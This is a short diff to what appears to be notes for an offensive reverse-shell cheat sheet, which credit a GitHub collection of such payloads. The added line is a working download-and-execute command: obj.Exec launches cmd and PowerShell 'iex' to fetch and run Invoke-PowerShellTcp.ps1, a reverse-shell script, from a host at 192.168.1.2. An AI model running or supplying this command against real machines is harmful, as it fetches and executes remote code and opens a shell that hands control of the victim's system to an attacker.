@@ -4,3 +4,5 @@
 ![image](https://user-images.githubusercontent.com/68978608/227783620-e81a7e9d-6dc6-494c-b459-36b666a35049.png)
 
 credits: @https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/tree/master
+
+obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.2/Invoke-PowerShellTcp.ps1')")
